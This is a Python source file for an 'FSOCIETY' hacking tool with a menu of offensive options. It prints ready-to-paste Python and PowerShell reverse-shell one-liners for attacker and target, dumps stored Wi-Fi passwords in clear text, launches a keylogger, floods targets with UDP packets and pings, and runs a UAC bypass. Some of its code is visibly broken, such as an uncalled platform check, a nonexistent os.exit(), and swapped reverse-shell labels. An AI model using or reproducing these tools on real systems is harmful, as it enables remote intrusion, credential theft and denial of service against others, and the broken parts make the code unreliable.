#F S O C I E T Y
#T O O L
import os
import platform
import time
import socket
import random
import threading
import requests

if platform.system() == "Windows":
    os.system("color 2")

def cls():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
        
def funcporter():
    target = input("ENTER TARGET IP OR HOSTNAME >>> ")
    start_port = int(input("START PORT >>> "))
    end_port = int(input("END PORT >>> "))

    print(f"SCANNING {target} FROM PORT {start_port} TO {end_port}...")

    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"[OPEN] PORT: {port}")
        sock.close()

def bypassuac(app):
    os.system(f'cmd /min /C "set __COMPAT_LAYER=runasinvoker && start "" "{app}"')

def reverse():
    iptolisten = input("    Enter IP >>> ")
    porter = input("    Enter Port >>> ")
    print("    ON ATTACKER:")
    print(f'''    powershell -NoP -NonI -W Hidden -Command "while ($true) {{ $listener = New-Object System.Net.Sockets.TcpListener('{iptolisten}', {porter}); $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); $bytes = New-Object byte[] 1024; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }}; $client.Close(); $listener.Stop() }}"''')
    print("\n    ON LISTENER:")
    print(f'powershell -NoP -NonI -W Hidden -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{iptolisten}\', {porter});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"')
    input("PRESS ENTER IF YOU'RE DONE COPYING \n")
    main()

def geofunc(ip):
    response = requests.get(f"https://ipinfo.io/{ip}/json")
    data = response.json()
    if 'bogon' in data:
        print("    [-] We dont allow bogon ips.")
    else:
        if 'ip' in data:
            print(f"    [+] IP Address: {data.get('ip', 'N/A')}")
            print(f"    [+] Country: {data.get('country', 'N/A')}")
            print(f"    [+] Region: {data.get('region', 'N/A')}")
            print(f"    [+] City: {data.get('city', 'N/A')}")
            print(f"    [+] Org: {data.get('org', 'N/A')}")
            print(f"    [+] Postal: {data.get('postal', 'N/A')}")
            print(f"    [+] HostName: {data.get('hostname', 'N/A')}")
            if 'loc' in data:
                lat, lon = data['loc'].split(',')
                print(f"    [+] Latitude: {lat}")
                print(f"    [+] Longitude: {lon}")
                vpn = requests.get(f"http://ip-api.com/json/{ip}?fields=proxy,hosting,mobile,query")
                vpna = vpn.json()  # <-- you forgot the () to call .json as a function
                if vpna['proxy']:  # <-- 'proxy' is a boolean, not a string
                    print(f"    [+] {ip} is using a VPN/proxy.")
                else:
                    print(f"    [-] {ip} is not using a VPN/proxy.")
        else:
            print("[-] Failed to get data.")
    input("    DONE COPYING? PRESS ENTER>>>")
    main()

def main():
    cls()
    print("""
     ________ ________  ________  ________  ___  _______  _________    ___    ___ 
|\\  _____\\\\   ____\\|\\   __  \\|\\   ____\\|\\  \\|\\  ___ \\|\\___   ___\\ |\\  \\  /  /|
\\ \\  \\__/\\ \\  \\___|\\ \\  \\|\\  \\ \\  \\___|\\ \\  \\ \\   __/\\|___ \\  \\_| \\ \\  \\/  / /
 \\ \\   __\\\\ \\_____  \\ \\  \\\\\\  \\ \\  \\    \\ \\  \\ \\  \\_|/__  \\ \\  \\   \\ \\    / / 
  \\ \\  \\_| \\|____|\\  \\ \\  \\\\\\  \\ \\  \\____\\ \\  \\ \\  \\_|\\ \\  \\ \\  \\   \\/  /  /  
   \\ \\__\\    ____\\_\\  \\ \\_______\\ \\_______\\ \\__\\ \\_______\\  \\ \\__\\__/  / /    
    \\|__|   |\\_________\\|_______|\\|_______|\\|__|\\|_______|   \\|__|\\___/ /     
            \\|_________|                                         \\|___|/      
                                                                              
                                                                              
    """)

    print("""
    ╔══════════════════════════════════════════════╗
    ║  1. Reverse Shell Generator (Linux Only)     ║
    ║  2. Wifi dump (Windows only)                 ║
    ║  3. Key Logger                               ║
    ║  4. DDoS attack                              ║
    ║  5. Real UDP DDoS.                           ║
    ║  6. GeoLocator                               ║
    ║  7. Reverse Shell Generator (Windows Only)   ║
    ║  8. UAC Bypass (Windows Only)                ║
    ║  9. Port Scanner                             ║
    ║ 10.Exit                                      ║
    ╚══════════════════════════════════════════════╝
    """)
    
    ecsia = input("    OPTION (e.g. 1) >>>")
    if ecsia == "1":
        if platform.system == "Windows":
            os.system("cls")
        else:
            os.system("clear")
        print("""
     ________ ________  ________  ________  ___  _______  _________    ___    ___ 
|\\  _____\\\\   ____\\|\\   __  \\|\\   ____\\|\\  \\|\\  ___ \\|\\___   ___\\ |\\  \\  /  /|
\\ \\  \\__/\\ \\  \\___|\\ \\  \\|\\  \\ \\  \\___|\\ \\  \\ \\   __/\\|___ \\  \\_| \\ \\  \\/  / /
 \\ \\   __\\\\ \\_____  \\ \\  \\\\\\  \\ \\  \\    \\ \\  \\ \\  \\_|/__  \\ \\  \\   \\ \\    / / 
  \\ \\  \\_| \\|____|\\  \\ \\  \\\\\\  \\ \\  \\____\\ \\  \\ \\  \\_|\\ \\  \\ \\  \\   \\/  /  /  
   \\ \\__\\    ____\\_\\  \\ \\_______\\ \\_______\\ \\__\\ \\_______\\  \\ \\__\\__/  / /    
    \\|__|   |\\_________\\|_______|\\|_______|\\|__|\\|_______|   \\|__|\\___/ /     
            \\|_________|                                         \\|___|/      
                                                                              
                                                                              
    """) 
        gen = input("    ENTER YOUR IP (e.g. 127.0.0.1) >>> ")
        gena = input("    ENTER YOUR PORT >>> ")
        
        print("\n    ON ATTACKER:")
        print(f'''    python -c "import socket,os; s=socket.socket(); s.bind(('{gen}',{gena})); s.listen(1); c,a=s.accept(); print('Connected:', a); exec('while True:\\n cmd=c.recv(1024).decode()\\n if cmd==\\\"exit\\\":break\\n o=os.popen(cmd).read()\\n c.send(o.encode())')"''')
        
        print("\n    ON TARGET:")
        print(f'''    python -c "import socket,subprocess; s=socket.socket(); s.connect(('{gen}',{gena})); exec('while True:\\n cmd=s.recv(1024).decode()\\n if cmd==\\\"exit\\\":break\\n o=subprocess.getoutput(cmd)\\n s.send(o.encode())')"''')
        
        done = input("\n    Done copying? [Y]es >>> ")
        cls()
        main()
    elif ecsia == "2":
        cls()
        print("""
         ________ ________  ________  ________  ___  _______  _________    ___    ___ 
    |\\  _____\\\\   ____\\|\\   __  \\|\\   ____\\|\\  \\|\\  ___ \\|\\___   ___\\ |\\  \\  /  /|
    \\ \\  \\__/\\ \\  \\___|\\ \\  \\|\\  \\ \\  \\___|\\ \\  \\ \\   __/\\|___ \\  \\_| \\ \\  \\/  / /
     \\ \\   __\\\\ \\_____  \\ \\  \\\\\\  \\ \\  \\    \\ \\  \\ \\  \\_|/__  \\ \\  \\   \\ \\    / / 
      \\ \\  \\_| \\|____|\\  \\ \\  \\\\\\  \\ \\  \\____\\ \\  \\ \\  \\_|\\ \\  \\ \\  \\   \\/  /  /  
       \\ \\__\\    ____\\_\\  \\ \\_______\\ \\_______\\ \\__\\ \\_______\\  \\ \\__\\__/  / /    
        \\|__|   |\\_________\\|_______|\\|_______|\\|__|\\|_______|   \\|__|\\___/ /     
                \\|_________|                                         \\|___|/      
                                                                                  
                                                                                  
        """)
        os.system("netsh wlan show profiles")
        print("\n")
        wifi = input("    WIFI TO CRACK >>>")
        os.system(f"netsh wlan show profiles '{wifi}' key=clear | find 'Key Content'")
        key = input("    Done copying? [Y]es >>")
        main()
    elif ecsia == "3":
        cls()
        print("""
         ________ ________  ________  ________  ___  _______  _________    ___    ___ 
    |\\  _____\\\\   ____\\|\\   __  \\|\\   ____\\|\\  \\|\\  ___ \\|\\___   ___\\ |\\  \\  /  /|
    \\ \\  \\__/\\ \\  \\___|\\ \\  \\|\\  \\ \\  \\___|\\ \\  \\ \\   __/\\|___ \\  \\_| \\ \\  \\/  / /
     \\ \\   __\\\\ \\_____  \\ \\  \\\\\\  \\ \\  \\    \\ \\  \\ \\  \\_|/__  \\ \\  \\   \\ \\    / / 
      \\ \\  \\_| \\|____|\\  \\ \\  \\\\\\  \\ \\  \\____\\ \\  \\ \\  \\_|\\ \\  \\ \\  \\   \\/  /  /  
       \\ \\__\\    ____\\_\\  \\ \\_______\\ \\_______\\ \\__\\ \\_______\\  \\ \\__\\__/  / /    
        \\|__|   |\\_________\\|_______|\\|_______|\\|__|\\|_______|   \\|__|\\___/ /     
                \\|_________|                                         \\|___|/      
                                                                                  
                                                                                  
        """)
        print("    THIS WILL OPEN keylogger.py IN FILES")
        os.system("python files/keylogger.py")
        main()
    elif ecsia == "4":
        cls()
        print("""
         ________ ________  ________  ________  ___  _______  _________    ___    ___ 
    |\\  _____\\\\   ____\\|\\   __  \\|\\   ____\\|\\  \\|\\  ___ \\|\\___   ___\\ |\\  \\  /  /|
    \\ \\  \\__/\\ \\  \\___|\\ \\  \\|\\  \\ \\  \\___|\\ \\  \\ \\   __/\\|___ \\  \\_| \\ \\  \\/  / /
     \\ \\   __\\\\ \\_____  \\ \\  \\\\\\  \\ \\  \\    \\ \\  \\ \\  \\_|/__  \\ \\  \\   \\ \\    / / 
      \\ \\  \\_| \\|____|\\  \\ \\  \\\\\\  \\ \\  \\____\\ \\  \\ \\  \\_|\\ \\  \\ \\  \\   \\/  /  /  
       \\ \\__\\    ____\\_\\  \\ \\_______\\ \\_______\\ \\__\\ \\_______\\  \\ \\__\\__/  / /    
        \\|__|   |\\_________\\|_______|\\|_______|\\|__|\\|_______|   \\|__|\\___/ /     
                \\|_________|                                         \\|___|/      
                                                                                  
                                                                                  
        """)
        print("\n")

        web = input("    ENTER WEBSITE TO ATTACK >>> ")
        thread_count = int(input("    ENTER HOW MANY BOTS >>> "))
        ping_count = int(input("    ENTER HOW MANY PINGS PER BOT >>> "))
        
        def attack(bot_id):
            for _ in range(ping_count):
                if platform.system() == "Windows":
                    os.system(f"ping {web} -n 1 >nul 2>&1")
                else:
                    os.system(f"ping {web} -c 1 > /dev/null 2>&1")
                print(f"    Attacked {web} by bot {bot_id}")
        
        threads = []
        
        for i in range(thread_count):
            t = threading.Thread(target=attack, args=(i + 1,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        main()
    elif ecsia == "5":
        cls()
        print("""
         ________ ________  ________  ________  ___  _______  _________    ___    ___ 
    |\\  _____\\\\   ____\\|\\   __  \\|\\   ____\\|\\  \\|\\  ___ \\|\\___   ___\\ |\\  \\  /  /|
    \\ \\  \\__/\\ \\  \\___|\\ \\  \\|\\  \\ \\  \\___|\\ \\  \\ \\   __/\\|___ \\  \\_| \\ \\  \\/  / /
     \\ \\   __\\\\ \\_____  \\ \\  \\\\\\  \\ \\  \\    \\ \\  \\ \\  \\_|/__  \\ \\  \\   \\ \\    / / 
      \\ \\  \\_| \\|____|\\  \\ \\  \\\\\\  \\ \\  \\____\\ \\  \\ \\  \\_|\\ \\  \\ \\  \\   \\/  /  /  
       \\ \\__\\    ____\\_\\  \\ \\_______\\ \\_______\\ \\__\\ \\_______\\  \\ \\__\\__/  / /    
        \\|__|   |\\_________\\|_______|\\|_______|\\|__|\\|_______|   \\|__|\\___/ /     
                \\|_________|                                         \\|___|/      
                                                                                  
                                                                                  
        """)
        print("\n")
        target = input("TARGET IP >>> ")
        port = int(input("TARGET PORT >>> "))
        threads = int(input("HOW MANY BOTS >>> "))
        
        def udp_flood():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_data = random._urandom(1024)
            while True:
                try:
                    sock.sendto(bytes_data, (target, port))
                    print(f"Sent packet to {target}:{port}")
                except:
                    print("Failed to send packet")
        
        for i in range(threads):
            t = threading.Thread(target=udp_flood)
            t.daemon = True
            t.start()
        
        input("Press Enter to stop...\n")
        main()
    elif ecsia == "6":
        cls()
        print("""
         ________ ________  ________  ________  ___  _______  _________    ___    ___ 
    |\\  _____\\\\   ____\\|\\   __  \\|\\   ____\\|\\  \\|\\  ___ \\|\\___   ___\\ |\\  \\  /  /|
    \\ \\  \\__/\\ \\  \\___|\\ \\  \\|\\  \\ \\  \\___|\\ \\  \\ \\   __/\\|___ \\  \\_| \\ \\  \\/  / /
     \\ \\   __\\\\ \\_____  \\ \\  \\\\\\  \\ \\  \\    \\ \\  \\ \\  \\_|/__  \\ \\  \\   \\ \\    / / 
      \\ \\  \\_| \\|____|\\  \\ \\  \\\\\\  \\ \\  \\____\\ \\  \\ \\  \\_|\\ \\  \\ \\  \\   \\/  /  /  
       \\ \\__\\    ____\\_\\  \\ \\_______\\ \\_______\\ \\__\\ \\_______\\  \\ \\__\\__/  / /    
        \\|__|   |\\_________\\|_______|\\|_______|\\|__|\\|_______|   \\|__|\\___/ /     
                \\|_________|                                         \\|___|/      
                                                                                  
                                                                                  
        """)
        iptext = input("    ENTER IP TO GET LOCATION >>> ")
        geofunc(iptext)
    elif ecsia == "7":
        reverse()
    elif ecsia == "10":
        print("""
         ________ ________  ________  ________  ___  _______  _________    ___    ___ 
    |\\  _____\\\\   ____\\|\\   __  \\|\\   ____\\|\\  \\|\\  ___ \\|\\___   ___\\ |\\  \\  /  /|
    \\ \\  \\__/\\ \\  \\___|\\ \\  \\|\\  \\ \\  \\___|\\ \\  \\ \\   __/\\|___ \\  \\_| \\ \\  \\/  / /
     \\ \\   __\\\\ \\_____  \\ \\  \\\\\\  \\ \\  \\    \\ \\  \\ \\  \\_|/__  \\ \\  \\   \\ \\    / / 
      \\ \\  \\_| \\|____|\\  \\ \\  \\\\\\  \\ \\  \\____\\ \\  \\ \\  \\_|\\ \\  \\ \\  \\   \\/  /  /  
       \\ \\__\\    ____\\_\\  \\ \\_______\\ \\_______\\ \\__\\ \\_______\\  \\ \\__\\__/  / /    
        \\|__|   |\\_________\\|_______|\\|_______|\\|__|\\|_______|   \\|__|\\___/ /     
                \\|_________|                                         \\|___|/      
                                                                                  
                                                                                  
        """)
        os.exit()
    elif ecsia == "8":
        cls()
        print("""
         ________ ________  ________  ________  ___  _______  _________    ___    ___ 
    |\\  _____\\\\   ____\\|\\   __  \\|\\   ____\\|\\  \\|\\  ___ \\|\\___   ___\\ |\\  \\  /  /|
    \\ \\  \\__/\\ \\  \\___|\\ \\  \\|\\  \\ \\  \\___|\\ \\  \\ \\   __/\\|___ \\  \\_| \\ \\  \\/  / /
     \\ \\   __\\\\ \\_____  \\ \\  \\\\\\  \\ \\  \\    \\ \\  \\ \\  \\_|/__  \\ \\  \\   \\ \\    / / 
      \\ \\  \\_| \\|____|\\  \\ \\  \\\\\\  \\ \\  \\____\\ \\  \\ \\  \\_|\\ \\  \\ \\  \\   \\/  /  /  
       \\ \\__\\    ____\\_\\  \\ \\_______\\ \\_______\\ \\__\\ \\_______\\  \\ \\__\\__/  / /    
        \\|__|   |\\_________\\|_______|\\|_______|\\|__|\\|_______|   \\|__|\\___/ /     
                \\|_________|                                         \\|___|/      
                                                                                  
                                                                                  
        """)
        appto = input("    ENTER APPLICATION LOCATION >>> ")
        bypassuac(appto)
        input("    PRESS ENTER TO GO BACK")
        main()
    elif ecsia == "9":
        cls()
        print("""
         ________ ________  ________  ________  ___  _______  _________    ___    ___ 
    |\\  _____\\\\   ____\\|\\   __  \\|\\   ____\\|\\  \\|\\  ___ \\|\\___   ___\\ |\\  \\  /  /|
    \\ \\  \\__/\\ \\  \\___|\\ \\  \\|\\  \\ \\  \\___|\\ \\  \\ \\   __/\\|___ \\  \\_| \\ \\  \\/  / /
     \\ \\   __\\\\ \\_____  \\ \\  \\\\\\  \\ \\  \\    \\ \\  \\ \\  \\_|/__  \\ \\  \\   \\ \\    / / 
      \\ \\  \\_| \\|____|\\  \\ \\  \\\\\\  \\ \\  \\____\\ \\  \\ \\  \\_|\\ \\  \\ \\  \\   \\/  /  /  
       \\ \\__\\    ____\\_\\  \\ \\_______\\ \\_______\\ \\__\\ \\_______\\  \\ \\__\\__/  / /    
        \\|__|   |\\_________\\|_______|\\|_______|\\|__|\\|_______|   \\|__|\\___/ /     
                \\|_________|                                         \\|___|/      
                                                                                  
                                                                                  
        """)
        funcporter()
    else:
        print("    INVALID OPTION")
        time.sleep(1)
        main()
    
main()